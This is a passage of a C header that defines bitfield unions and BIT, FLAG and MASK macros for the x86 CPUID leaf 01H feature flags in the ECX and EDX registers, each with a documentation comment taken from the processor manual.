#define CPUID_FEATURE_INFORMATION_ECX_THERMAL_MONITOR_2_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_THERMAL_MONITOR_2(_) (((_) >> 8) & 0x01)

      /**
       * @brief Supplemental Streaming SIMD Extensions 3 (SSSE3)
       *
       * [Bit 9] A value of 1 indicates the presence of the Supplemental Streaming SIMD Extensions 3
       * (SSSE3). A value of 0 indicates the instruction extensions are not present in the
       * processor.
       */
      UINT32 SupplementalStreamingSimdExtensions3 : 1;
#define CPUID_FEATURE_INFORMATION_ECX_SUPPLEMENTAL_STREAMING_SIMD_EXTENSIONS_3_BIT 9
#define CPUID_FEATURE_INFORMATION_ECX_SUPPLEMENTAL_STREAMING_SIMD_EXTENSIONS_3_FLAG 0x200
#define CPUID_FEATURE_INFORMATION_ECX_SUPPLEMENTAL_STREAMING_SIMD_EXTENSIONS_3_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_SUPPLEMENTAL_STREAMING_SIMD_EXTENSIONS_3(_) \
  (((_) >> 9) & 0x01)

      /**
       * @brief L1 Context ID
       *
       * [Bit 10] A value of 1 indicates the L1 data cache mode can be set to either adaptive mode
       * or shared mode. A value of 0 indicates this feature is not supported. See definition of the
       * IA32_MISC_ENABLE MSR Bit 24 (L1 Data Cache Context Mode) for details.
       */
      UINT32 L1ContextId : 1;
#define CPUID_FEATURE_INFORMATION_ECX_L1_CONTEXT_ID_BIT 10
#define CPUID_FEATURE_INFORMATION_ECX_L1_CONTEXT_ID_FLAG 0x400
#define CPUID_FEATURE_INFORMATION_ECX_L1_CONTEXT_ID_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_L1_CONTEXT_ID(_) (((_) >> 10) & 0x01)

      /**
       * @brief IA32_DEBUG_INTERFACE MSR for silicon debug
       *
       * [Bit 11] A value of 1 indicates the processor supports IA32_DEBUG_INTERFACE MSR for silicon
       * debug.
       */
      UINT32 SiliconDebug : 1;
#define CPUID_FEATURE_INFORMATION_ECX_SILICON_DEBUG_BIT 11
#define CPUID_FEATURE_INFORMATION_ECX_SILICON_DEBUG_FLAG 0x800
#define CPUID_FEATURE_INFORMATION_ECX_SILICON_DEBUG_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_SILICON_DEBUG(_) (((_) >> 11) & 0x01)

      /**
       * @brief FMA extensions using YMM state
       *
       * [Bit 12] A value of 1 indicates the processor supports FMA (Fused Multiple Add) extensions
       * using YMM state.
       */
      UINT32 FmaExtensions : 1;
#define CPUID_FEATURE_INFORMATION_ECX_FMA_EXTENSIONS_BIT 12
#define CPUID_FEATURE_INFORMATION_ECX_FMA_EXTENSIONS_FLAG 0x1000
#define CPUID_FEATURE_INFORMATION_ECX_FMA_EXTENSIONS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_FMA_EXTENSIONS(_) (((_) >> 12) & 0x01)

      /**
       * @brief CMPXCHG16B instruction
       *
       * [Bit 13] A value of 1 indicates that the feature is available.
       */
      UINT32 Cmpxchg16BInstruction : 1;
#define CPUID_FEATURE_INFORMATION_ECX_CMPXCHG16B_INSTRUCTION_BIT 13
#define CPUID_FEATURE_INFORMATION_ECX_CMPXCHG16B_INSTRUCTION_FLAG 0x2000
#define CPUID_FEATURE_INFORMATION_ECX_CMPXCHG16B_INSTRUCTION_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_CMPXCHG16B_INSTRUCTION(_) (((_) >> 13) & 0x01)

      /**
       * @brief xTPR Update Control
       *
       * [Bit 14] A value of 1 indicates that the processor supports changing IA32_MISC_ENABLE[bit
       * 23].
       */
      UINT32 XtprUpdateControl : 1;
#define CPUID_FEATURE_INFORMATION_ECX_XTPR_UPDATE_CONTROL_BIT 14
#define CPUID_FEATURE_INFORMATION_ECX_XTPR_UPDATE_CONTROL_FLAG 0x4000
#define CPUID_FEATURE_INFORMATION_ECX_XTPR_UPDATE_CONTROL_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_XTPR_UPDATE_CONTROL(_) (((_) >> 14) & 0x01)

      /**
       * @brief Perfmon and Debug Capability
       *
       * [Bit 15] A value of 1 indicates the processor supports the performance and debug feature
       * indication MSR IA32_PERF_CAPABILITIES.
       */
      UINT32 PerfmonAndDebugCapability : 1;
#define CPUID_FEATURE_INFORMATION_ECX_PERFMON_AND_DEBUG_CAPABILITY_BIT 15
#define CPUID_FEATURE_INFORMATION_ECX_PERFMON_AND_DEBUG_CAPABILITY_FLAG 0x8000
#define CPUID_FEATURE_INFORMATION_ECX_PERFMON_AND_DEBUG_CAPABILITY_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_PERFMON_AND_DEBUG_CAPABILITY(_) (((_) >> 15) & 0x01)
      UINT32 Reserved1 : 1;

      /**
       * @brief Process-context identifiers
       *
       * [Bit 17] A value of 1 indicates that the processor supports PCIDs and that software may set
       * CR4.PCIDE to 1.
       */
      UINT32 ProcessContextIdentifiers : 1;
#define CPUID_FEATURE_INFORMATION_ECX_PROCESS_CONTEXT_IDENTIFIERS_BIT 17
#define CPUID_FEATURE_INFORMATION_ECX_PROCESS_CONTEXT_IDENTIFIERS_FLAG 0x20000
#define CPUID_FEATURE_INFORMATION_ECX_PROCESS_CONTEXT_IDENTIFIERS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_PROCESS_CONTEXT_IDENTIFIERS(_) (((_) >> 17) & 0x01)

      /**
       * @brief Direct Cache Access
       *
       * [Bit 18] A value of 1 indicates the processor supports the ability to prefetch data from a
       * memory mapped device (Direct Cache Access).
       */
      UINT32 DirectCacheAccess : 1;
#define CPUID_FEATURE_INFORMATION_ECX_DIRECT_CACHE_ACCESS_BIT 18
#define CPUID_FEATURE_INFORMATION_ECX_DIRECT_CACHE_ACCESS_FLAG 0x40000
#define CPUID_FEATURE_INFORMATION_ECX_DIRECT_CACHE_ACCESS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_DIRECT_CACHE_ACCESS(_) (((_) >> 18) & 0x01)

      /**
       * @brief SSE4.1 support
       *
       * [Bit 19] A value of 1 indicates that the processor supports SSE4.1.
       */
      UINT32 Sse41Support : 1;
#define CPUID_FEATURE_INFORMATION_ECX_SSE41_SUPPORT_BIT 19
#define CPUID_FEATURE_INFORMATION_ECX_SSE41_SUPPORT_FLAG 0x80000
#define CPUID_FEATURE_INFORMATION_ECX_SSE41_SUPPORT_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_SSE41_SUPPORT(_) (((_) >> 19) & 0x01)

      /**
       * @brief SSE4.2 support
       *
       * [Bit 20] A value of 1 indicates that the processor supports SSE4.2.
       */
      UINT32 Sse42Support : 1;
#define CPUID_FEATURE_INFORMATION_ECX_SSE42_SUPPORT_BIT 20
#define CPUID_FEATURE_INFORMATION_ECX_SSE42_SUPPORT_FLAG 0x100000
#define CPUID_FEATURE_INFORMATION_ECX_SSE42_SUPPORT_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_SSE42_SUPPORT(_) (((_) >> 20) & 0x01)

      /**
       * @brief x2APIC support
       *
       * [Bit 21] A value of 1 indicates that the processor supports x2APIC feature.
       */
      UINT32 X2ApicSupport : 1;
#define CPUID_FEATURE_INFORMATION_ECX_X2APIC_SUPPORT_BIT 21
#define CPUID_FEATURE_INFORMATION_ECX_X2APIC_SUPPORT_FLAG 0x200000
#define CPUID_FEATURE_INFORMATION_ECX_X2APIC_SUPPORT_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_X2APIC_SUPPORT(_) (((_) >> 21) & 0x01)

      /**
       * @brief MOVBE instruction
       *
       * [Bit 22] A value of 1 indicates that the processor supports MOVBE instruction.
       */
      UINT32 MovbeInstruction : 1;
#define CPUID_FEATURE_INFORMATION_ECX_MOVBE_INSTRUCTION_BIT 22
#define CPUID_FEATURE_INFORMATION_ECX_MOVBE_INSTRUCTION_FLAG 0x400000
#define CPUID_FEATURE_INFORMATION_ECX_MOVBE_INSTRUCTION_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_MOVBE_INSTRUCTION(_) (((_) >> 22) & 0x01)

      /**
       * @brief POPCNT instruction
       *
       * [Bit 23] A value of 1 indicates that the processor supports the POPCNT instruction.
       */
      UINT32 PopcntInstruction : 1;
#define CPUID_FEATURE_INFORMATION_ECX_POPCNT_INSTRUCTION_BIT 23
#define CPUID_FEATURE_INFORMATION_ECX_POPCNT_INSTRUCTION_FLAG 0x800000
#define CPUID_FEATURE_INFORMATION_ECX_POPCNT_INSTRUCTION_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_POPCNT_INSTRUCTION(_) (((_) >> 23) & 0x01)

      /**
       * @brief TSC Deadline
       *
       * [Bit 24] A value of 1 indicates that the processor's local APIC timer supports one-shot
       * operation using a TSC deadline value.
       */
      UINT32 TscDeadline : 1;
#define CPUID_FEATURE_INFORMATION_ECX_TSC_DEADLINE_BIT 24
#define CPUID_FEATURE_INFORMATION_ECX_TSC_DEADLINE_FLAG 0x1000000
#define CPUID_FEATURE_INFORMATION_ECX_TSC_DEADLINE_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_TSC_DEADLINE(_) (((_) >> 24) & 0x01)

      /**
       * @brief AESNI instruction extensions
       *
       * [Bit 25] A value of 1 indicates that the processor supports the AESNI instruction
       * extensions.
       */
      UINT32 AesniInstructionExtensions : 1;
#define CPUID_FEATURE_INFORMATION_ECX_AESNI_INSTRUCTION_EXTENSIONS_BIT 25
#define CPUID_FEATURE_INFORMATION_ECX_AESNI_INSTRUCTION_EXTENSIONS_FLAG 0x2000000
#define CPUID_FEATURE_INFORMATION_ECX_AESNI_INSTRUCTION_EXTENSIONS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_AESNI_INSTRUCTION_EXTENSIONS(_) (((_) >> 25) & 0x01)

      /**
       * @brief XSAVE/XRSTOR instruction extensions
       *
       * [Bit 26] A value of 1 indicates that the processor supports the XSAVE/XRSTOR processor
       * extended states feature, the XSETBV/XGETBV instructions, and XCR0.
       */
      UINT32 XsaveXrstorInstruction : 1;
#define CPUID_FEATURE_INFORMATION_ECX_XSAVE_XRSTOR_INSTRUCTION_BIT 26
#define CPUID_FEATURE_INFORMATION_ECX_XSAVE_XRSTOR_INSTRUCTION_FLAG 0x4000000
#define CPUID_FEATURE_INFORMATION_ECX_XSAVE_XRSTOR_INSTRUCTION_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_XSAVE_XRSTOR_INSTRUCTION(_) (((_) >> 26) & 0x01)

      /**
       * @brief CR4.OSXSAVE[bit 18] set
       *
       * [Bit 27] A value of 1 indicates that the OS has set CR4.OSXSAVE[bit 18] to enable
       * XSETBV/XGETBV instructions to access XCR0 and to support processor extended state
       * management using XSAVE/XRSTOR.
       */
      UINT32 OsxSave : 1;
#define CPUID_FEATURE_INFORMATION_ECX_OSX_SAVE_BIT 27
#define CPUID_FEATURE_INFORMATION_ECX_OSX_SAVE_FLAG 0x8000000
#define CPUID_FEATURE_INFORMATION_ECX_OSX_SAVE_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_OSX_SAVE(_) (((_) >> 27) & 0x01)

      /**
       * @brief AVX instruction extensions support
       *
       * [Bit 28] A value of 1 indicates the processor supports the AVX instruction extensions.
       */
      UINT32 AvxSupport : 1;
#define CPUID_FEATURE_INFORMATION_ECX_AVX_SUPPORT_BIT 28
#define CPUID_FEATURE_INFORMATION_ECX_AVX_SUPPORT_FLAG 0x10000000
#define CPUID_FEATURE_INFORMATION_ECX_AVX_SUPPORT_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_AVX_SUPPORT(_) (((_) >> 28) & 0x01)

      /**
       * @brief 16-bit floating-point conversion instructions support
       *
       * [Bit 29] A value of 1 indicates that processor supports 16-bit floating-point conversion
       * instructions.
       */
      UINT32 HalfPrecisionConversionInstructions : 1;
#define CPUID_FEATURE_INFORMATION_ECX_HALF_PRECISION_CONVERSION_INSTRUCTIONS_BIT 29
#define CPUID_FEATURE_INFORMATION_ECX_HALF_PRECISION_CONVERSION_INSTRUCTIONS_FLAG 0x20000000
#define CPUID_FEATURE_INFORMATION_ECX_HALF_PRECISION_CONVERSION_INSTRUCTIONS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_HALF_PRECISION_CONVERSION_INSTRUCTIONS(_) (((_) >> 29) & 0x01)

      /**
       * @brief RDRAND instruction support
       *
       * [Bit 30] A value of 1 indicates that processor supports RDRAND instruction.
       */
      UINT32 RdrandInstruction : 1;
#define CPUID_FEATURE_INFORMATION_ECX_RDRAND_INSTRUCTION_BIT 30
#define CPUID_FEATURE_INFORMATION_ECX_RDRAND_INSTRUCTION_FLAG 0x40000000
#define CPUID_FEATURE_INFORMATION_ECX_RDRAND_INSTRUCTION_MASK 0x01
#define CPUID_FEATURE_INFORMATION_ECX_RDRAND_INSTRUCTION(_) (((_) >> 30) & 0x01)
      UINT32 Reserved2 : 1;
    };

    UINT32 Flags;
  } CpuidFeatureInformationEcx;

  /**
   * @brief When CPUID executes with EAX set to 01H, feature information is returned in ECX and EDX
   */
  union {
    struct {
      /**
       * @brief Floating Point Unit On-Chip
       *
       * [Bit 0] The processor contains an x87 FPU.
       */
      UINT32 FloatingPointUnitOnChip : 1;
#define CPUID_FEATURE_INFORMATION_EDX_FLOATING_POINT_UNIT_ON_CHIP_BIT 0
#define CPUID_FEATURE_INFORMATION_EDX_FLOATING_POINT_UNIT_ON_CHIP_FLAG 0x01
#define CPUID_FEATURE_INFORMATION_EDX_FLOATING_POINT_UNIT_ON_CHIP_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_FLOATING_POINT_UNIT_ON_CHIP(_) (((_) >> 0) & 0x01)

      /**
       * @brief Virtual 8086 Mode Enhancements
       *
       * [Bit 1] Virtual 8086 mode enhancements, including CR4.VME for controlling the feature,
       * CR4.PVI for protected mode virtual interrupts, software interrupt indirection, expansion of
       * the TSS with the software indirection bitmap, and EFLAGS.VIF and EFLAGS.VIP flags.
       */
      UINT32 Virtual8086ModeEnhancements : 1;
#define CPUID_FEATURE_INFORMATION_EDX_VIRTUAL_8086_MODE_ENHANCEMENTS_BIT 1
#define CPUID_FEATURE_INFORMATION_EDX_VIRTUAL_8086_MODE_ENHANCEMENTS_FLAG 0x02
#define CPUID_FEATURE_INFORMATION_EDX_VIRTUAL_8086_MODE_ENHANCEMENTS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_VIRTUAL_8086_MODE_ENHANCEMENTS(_) (((_) >> 1) & 0x01)

      /**
       * @brief Debugging Extensions
       *
       * [Bit 2] Support for I/O breakpoints, including CR4.DE for controlling the feature, and
       * optional trapping of accesses to DR4 and DR5.
       */
      UINT32 DebuggingExtensions : 1;
#define CPUID_FEATURE_INFORMATION_EDX_DEBUGGING_EXTENSIONS_BIT 2
#define CPUID_FEATURE_INFORMATION_EDX_DEBUGGING_EXTENSIONS_FLAG 0x04
#define CPUID_FEATURE_INFORMATION_EDX_DEBUGGING_EXTENSIONS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_DEBUGGING_EXTENSIONS(_) (((_) >> 2) & 0x01)

      /**
       * @brief Page Size Extension
       *
       * [Bit 3] Large pages of size 4 MByte are supported, including CR4.PSE for controlling the
       * feature, the defined dirty bit in PDE (Page Directory Entries), optional reserved bit
       * trapping in CR3, PDEs, and PTEs.
       */
      UINT32 PageSizeExtension : 1;
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_SIZE_EXTENSION_BIT 3
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_SIZE_EXTENSION_FLAG 0x08
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_SIZE_EXTENSION_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_SIZE_EXTENSION(_) (((_) >> 3) & 0x01)

      /**
       * @brief Time Stamp Counter
       *
       * [Bit 4] The RDTSC instruction is supported, including CR4.TSD for controlling privilege.
       */
      UINT32 TimestampCounter : 1;
#define CPUID_FEATURE_INFORMATION_EDX_TIMESTAMP_COUNTER_BIT 4
#define CPUID_FEATURE_INFORMATION_EDX_TIMESTAMP_COUNTER_FLAG 0x10
#define CPUID_FEATURE_INFORMATION_EDX_TIMESTAMP_COUNTER_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_TIMESTAMP_COUNTER(_) (((_) >> 4) & 0x01)

      /**
       * @brief Model Specific Registers RDMSR and WRMSR Instructions
       *
       * [Bit 5] The RDMSR and WRMSR instructions are supported. Some of the MSRs are implementation
       * dependent.
       */
      UINT32 RdmsrWrmsrInstructions : 1;
#define CPUID_FEATURE_INFORMATION_EDX_RDMSR_WRMSR_INSTRUCTIONS_BIT 5
#define CPUID_FEATURE_INFORMATION_EDX_RDMSR_WRMSR_INSTRUCTIONS_FLAG 0x20
#define CPUID_FEATURE_INFORMATION_EDX_RDMSR_WRMSR_INSTRUCTIONS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_RDMSR_WRMSR_INSTRUCTIONS(_) (((_) >> 5) & 0x01)

      /**
       * @brief Physical Address Extension
       *
       * [Bit 6] Physical addresses greater than 32 bits are supported: extended page table entry
       * formats, an extra level in the page translation tables is defined, 2-MByte pages are
       * supported instead of 4 Mbyte pages if PAE bit is 1.
       */
      UINT32 PhysicalAddressExtension : 1;
#define CPUID_FEATURE_INFORMATION_EDX_PHYSICAL_ADDRESS_EXTENSION_BIT 6
#define CPUID_FEATURE_INFORMATION_EDX_PHYSICAL_ADDRESS_EXTENSION_FLAG 0x40
#define CPUID_FEATURE_INFORMATION_EDX_PHYSICAL_ADDRESS_EXTENSION_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_PHYSICAL_ADDRESS_EXTENSION(_) (((_) >> 6) & 0x01)

      /**
       * @brief Machine Check Exception
       *
       * [Bit 7] Exception 18 is defined for Machine Checks, including CR4.MCE for controlling the
       * feature. This feature does not define the model-specific implementations of machine-check
       * error logging, reporting, and processor shutdowns. Machine Check exception handlers may
       * have to depend on processor version to do model specific processing of the exception, or
       * test for the presence of the Machine Check feature.
       */
      UINT32 MachineCheckException : 1;
#define CPUID_FEATURE_INFORMATION_EDX_MACHINE_CHECK_EXCEPTION_BIT 7
#define CPUID_FEATURE_INFORMATION_EDX_MACHINE_CHECK_EXCEPTION_FLAG 0x80
#define CPUID_FEATURE_INFORMATION_EDX_MACHINE_CHECK_EXCEPTION_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_MACHINE_CHECK_EXCEPTION(_) (((_) >> 7) & 0x01)

      /**
       * @brief CMPXCHG8B Instruction
       *
       * [Bit 8] The compare-and-exchange 8 bytes (64 bits) instruction is supported (implicitly
       * locked and atomic).
       */
      UINT32 Cmpxchg8B : 1;
#define CPUID_FEATURE_INFORMATION_EDX_CMPXCHG8B_BIT 8
#define CPUID_FEATURE_INFORMATION_EDX_CMPXCHG8B_FLAG 0x100
#define CPUID_FEATURE_INFORMATION_EDX_CMPXCHG8B_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_CMPXCHG8B(_) (((_) >> 8) & 0x01)

      /**
       * @brief APIC On-Chip
       *
       * [Bit 9] The processor contains an Advanced Programmable Interrupt Controller (APIC),
       * responding to memory mapped commands in the physical address range FFFE0000H to FFFE0FFFH
       * (by default - some processors permit the APIC to be relocated).
       */
      UINT32 ApicOnChip : 1;
#define CPUID_FEATURE_INFORMATION_EDX_APIC_ON_CHIP_BIT 9
#define CPUID_FEATURE_INFORMATION_EDX_APIC_ON_CHIP_FLAG 0x200
#define CPUID_FEATURE_INFORMATION_EDX_APIC_ON_CHIP_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_APIC_ON_CHIP(_) (((_) >> 9) & 0x01)
      UINT32 Reserved1 : 1;

      /**
       * @brief SYSENTER and SYSEXIT Instructions
       *
       * [Bit 11] The SYSENTER and SYSEXIT and associated MSRs are supported.
       */
      UINT32 SysenterSysexitInstructions : 1;
#define CPUID_FEATURE_INFORMATION_EDX_SYSENTER_SYSEXIT_INSTRUCTIONS_BIT 11
#define CPUID_FEATURE_INFORMATION_EDX_SYSENTER_SYSEXIT_INSTRUCTIONS_FLAG 0x800
#define CPUID_FEATURE_INFORMATION_EDX_SYSENTER_SYSEXIT_INSTRUCTIONS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_SYSENTER_SYSEXIT_INSTRUCTIONS(_) (((_) >> 11) & 0x01)

      /**
       * @brief Memory Type Range Registers
       *
       * [Bit 12] MTRRs are supported. The MTRRcap MSR contains feature bits that describe what
       * memory types are supported, how many variable MTRRs are supported, and whether fixed MTRRs
       * are supported.
       */
      UINT32 MemoryTypeRangeRegisters : 1;
#define CPUID_FEATURE_INFORMATION_EDX_MEMORY_TYPE_RANGE_REGISTERS_BIT 12
#define CPUID_FEATURE_INFORMATION_EDX_MEMORY_TYPE_RANGE_REGISTERS_FLAG 0x1000
#define CPUID_FEATURE_INFORMATION_EDX_MEMORY_TYPE_RANGE_REGISTERS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_MEMORY_TYPE_RANGE_REGISTERS(_) (((_) >> 12) & 0x01)

      /**
       * @brief Page Global Bit
       *
       * [Bit 13] The global bit is supported in paging-structure entries that map a page,
       * indicating TLB entries that are common to different processes and need not be flushed. The
       * CR4.PGE bit controls this feature.
       */
      UINT32 PageGlobalBit : 1;
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_GLOBAL_BIT_BIT 13
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_GLOBAL_BIT_FLAG 0x2000
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_GLOBAL_BIT_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_GLOBAL_BIT(_) (((_) >> 13) & 0x01)

      /**
       * @brief Machine Check Architecture
       *
       * [Bit 14] A value of 1 indicates the Machine Check Architecture of reporting machine errors
       * is supported. The MCG_CAP MSR contains feature bits describing how many banks of error
       * reporting MSRs are supported.
       */
      UINT32 MachineCheckArchitecture : 1;
#define CPUID_FEATURE_INFORMATION_EDX_MACHINE_CHECK_ARCHITECTURE_BIT 14
#define CPUID_FEATURE_INFORMATION_EDX_MACHINE_CHECK_ARCHITECTURE_FLAG 0x4000
#define CPUID_FEATURE_INFORMATION_EDX_MACHINE_CHECK_ARCHITECTURE_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_MACHINE_CHECK_ARCHITECTURE(_) (((_) >> 14) & 0x01)

      /**
       * @brief Conditional Move Instructions
       *
       * [Bit 15] The conditional move instruction CMOV is supported. In addition, if x87 FPU is
       * present as indicated by the CPUID.FPU feature bit, then the FCOMI and FCMOV instructions
       * are supported
       */
      UINT32 ConditionalMoveInstructions : 1;
#define CPUID_FEATURE_INFORMATION_EDX_CONDITIONAL_MOVE_INSTRUCTIONS_BIT 15
#define CPUID_FEATURE_INFORMATION_EDX_CONDITIONAL_MOVE_INSTRUCTIONS_FLAG 0x8000
#define CPUID_FEATURE_INFORMATION_EDX_CONDITIONAL_MOVE_INSTRUCTIONS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_CONDITIONAL_MOVE_INSTRUCTIONS(_) (((_) >> 15) & 0x01)

      /**
       * @brief Page Attribute Table
       *
       * [Bit 16] Page Attribute Table is supported. This feature augments the Memory Type Range
       * Registers (MTRRs), allowing an operating system to specify attributes of memory accessed
       * through a linear address on a 4KB granularity.
       */
      UINT32 PageAttributeTable : 1;
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_ATTRIBUTE_TABLE_BIT 16
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_ATTRIBUTE_TABLE_FLAG 0x10000
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_ATTRIBUTE_TABLE_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_ATTRIBUTE_TABLE(_) (((_) >> 16) & 0x01)

      /**
       * @brief 36-Bit Page Size Extension
       *
       * [Bit 17] 4-MByte pages addressing physical memory beyond 4 GBytes are supported with 32-bit
       * paging. This feature indicates that upper bits of the physical address of a 4-MByte page
       * are encoded in bits 20:13 of the page-directory entry. Such physical addresses are limited
       * by MAXPHYADDR and may be up to 40 bits in size.
       */
      UINT32 PageSizeExtension36Bit : 1;
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_SIZE_EXTENSION_36BIT_BIT 17
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_SIZE_EXTENSION_36BIT_FLAG 0x20000
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_SIZE_EXTENSION_36BIT_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_PAGE_SIZE_EXTENSION_36BIT(_) (((_) >> 17) & 0x01)

      /**
       * @brief Processor Serial Number
       *
       * [Bit 18] The processor supports the 96-bit processor identification number feature and the
       * feature is enabled.
       */
      UINT32 ProcessorSerialNumber : 1;
#define CPUID_FEATURE_INFORMATION_EDX_PROCESSOR_SERIAL_NUMBER_BIT 18
#define CPUID_FEATURE_INFORMATION_EDX_PROCESSOR_SERIAL_NUMBER_FLAG 0x40000
#define CPUID_FEATURE_INFORMATION_EDX_PROCESSOR_SERIAL_NUMBER_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_PROCESSOR_SERIAL_NUMBER(_) (((_) >> 18) & 0x01)

      /**
       * @brief CLFLUSH Instruction
       *
       * [Bit 19] CLFLUSH Instruction is supported.
       */
      UINT32 Clflush : 1;
#define CPUID_FEATURE_INFORMATION_EDX_CLFLUSH_BIT 19
#define CPUID_FEATURE_INFORMATION_EDX_CLFLUSH_FLAG 0x80000
#define CPUID_FEATURE_INFORMATION_EDX_CLFLUSH_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_CLFLUSH(_) (((_) >> 19) & 0x01)
      UINT32 Reserved2 : 1;

      /**
       * @brief Debug Store
       *
       * [Bit 21] The processor supports the ability to write debug information into a memory
       * resident buffer. This feature is used by the branch trace store (BTS) and processor
       * event-based sampling (PEBS) facilities.
       *
       * @see Vol3C[23(INTRODUCTION TO VIRTUAL MACHINE EXTENSIONS)]
       */
      UINT32 DebugStore : 1;
#define CPUID_FEATURE_INFORMATION_EDX_DEBUG_STORE_BIT 21
#define CPUID_FEATURE_INFORMATION_EDX_DEBUG_STORE_FLAG 0x200000
#define CPUID_FEATURE_INFORMATION_EDX_DEBUG_STORE_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_DEBUG_STORE(_) (((_) >> 21) & 0x01)

      /**
       * @brief Thermal Monitor and Software Controlled Clock Facilities
       *
       * [Bit 22] The processor implements internal MSRs that allow processor temperature to be
       * monitored and processor performance to be modulated in predefined duty cycles under
       * software control.
       */
      UINT32 ThermalControlMsrsForAcpi : 1;
#define CPUID_FEATURE_INFORMATION_EDX_THERMAL_CONTROL_MSRS_FOR_ACPI_BIT 22
#define CPUID_FEATURE_INFORMATION_EDX_THERMAL_CONTROL_MSRS_FOR_ACPI_FLAG 0x400000
#define CPUID_FEATURE_INFORMATION_EDX_THERMAL_CONTROL_MSRS_FOR_ACPI_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_THERMAL_CONTROL_MSRS_FOR_ACPI(_) (((_) >> 22) & 0x01)

      /**
       * @brief Intel MMX Technology
       *
       * [Bit 23] The processor supports the Intel MMX technology.
       */
      UINT32 MmxSupport : 1;
#define CPUID_FEATURE_INFORMATION_EDX_MMX_SUPPORT_BIT 23
#define CPUID_FEATURE_INFORMATION_EDX_MMX_SUPPORT_FLAG 0x800000
#define CPUID_FEATURE_INFORMATION_EDX_MMX_SUPPORT_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_MMX_SUPPORT(_) (((_) >> 23) & 0x01)

      /**
       * @brief FXSAVE and FXRSTOR Instructions
       *
       * [Bit 24] The FXSAVE and FXRSTOR instructions are supported for fast save and restore of the
       * floating point context. Presence of this bit also indicates that CR4.OSFXSR is available
       * for an operating system to indicate that it supports the FXSAVE and FXRSTOR instructions.
       */
      UINT32 FxsaveFxrstorInstructions : 1;
#define CPUID_FEATURE_INFORMATION_EDX_FXSAVE_FXRSTOR_INSTRUCTIONS_BIT 24
#define CPUID_FEATURE_INFORMATION_EDX_FXSAVE_FXRSTOR_INSTRUCTIONS_FLAG 0x1000000
#define CPUID_FEATURE_INFORMATION_EDX_FXSAVE_FXRSTOR_INSTRUCTIONS_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_FXSAVE_FXRSTOR_INSTRUCTIONS(_) (((_) >> 24) & 0x01)

      /**
       * @brief SSE extensions support
       *
       * [Bit 25] The processor supports the SSE extensions.
       */
      UINT32 SseSupport : 1;
#define CPUID_FEATURE_INFORMATION_EDX_SSE_SUPPORT_BIT 25
#define CPUID_FEATURE_INFORMATION_EDX_SSE_SUPPORT_FLAG 0x2000000
#define CPUID_FEATURE_INFORMATION_EDX_SSE_SUPPORT_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_SSE_SUPPORT(_) (((_) >> 25) & 0x01)

      /**
       * @brief SSE2 extensions support
       *
       * [Bit 26] The processor supports the SSE2 extensions.
       */
      UINT32 Sse2Support : 1;
#define CPUID_FEATURE_INFORMATION_EDX_SSE2_SUPPORT_BIT 26
#define CPUID_FEATURE_INFORMATION_EDX_SSE2_SUPPORT_FLAG 0x4000000
#define CPUID_FEATURE_INFORMATION_EDX_SSE2_SUPPORT_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_SSE2_SUPPORT(_) (((_) >> 26) & 0x01)

      /**
       * @brief Self Snoop
       *
       * [Bit 27] The processor supports the management of conflicting memory types by performing a
       * snoop of its own cache structure for transactions issued to the bus.
       */
      UINT32 SelfSnoop : 1;
